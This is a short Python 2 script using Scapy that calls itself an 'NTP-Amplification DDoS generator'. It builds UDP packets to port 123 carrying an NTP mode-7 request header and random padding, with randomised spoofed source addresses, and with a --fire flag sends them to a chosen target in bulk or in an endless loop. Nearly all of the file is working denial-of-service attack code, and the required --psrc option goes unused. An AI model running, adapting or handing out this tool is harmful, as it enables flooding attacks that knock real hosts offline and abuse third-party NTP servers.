#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#

import argparse

from scapy.all import Ether, IP, UDP, NTP, Raw
from scapy.all import RandString, RandIP, fuzz, sendp, srp, hexdump
from scapy.all import NTPInfoPeerList, NTPInfoPeerStats


parser = argparse.ArgumentParser(
    description="NTP-Amplification DDoS generator.",
    epilog=' '  # a0 here
)

parser.add_argument('--fire', action='store_true',
                    help='send instead of show packets (default: false)')

parser.add_argument('-i', '--iface', required=True)

parser.add_argument('-s', '--size', type=int, default=512,
        help='UDP packet size, default: 512')

parser.add_argument('-c', '--count', type=int, default=10,
                    help="packets to send (default: 10, 0 to unlim)")

parser.add_argument('-t', '--inter', type=float, default=0.001,
                    help="interval between packets (default: 0.001 second)")

parser.add_argument('--dst', required=True, help="dst MAC")

# parser.add_argument('--src', help="default: auto")

parser.add_argument('--psrc', help="src IP", required=True)

parser.add_argument('--pdst', help="dst IP", required=True)

parser.add_argument('--hexdump', default=False, action='store_true',
                    help="show hex dump (if not --fire; default: false)")

options = parser.parse_args()

#
# make initial packet:
p = Ether(dst=options.dst) \
        / IP(version=4, dst=options.pdst, src=RandIP()) \
        / UDP(sport=123,dport=123) \
        / Raw(load="\xd7\x00\x03\x2a\x00\x06\x00\x48" +
                str(RandString(size=options.size-16)))

if options.fire:
    try:
        if options.count == 0:
            sendp(p,loop=1,iface=options.iface)
        else:
            sendp(p,count=options.count,iface=options.iface)

    except KeyboardInterrupt:
        print '\nInterrupted.'

else:
    if options.hexdump:
        hexdump(p)
    else:
        p.show()

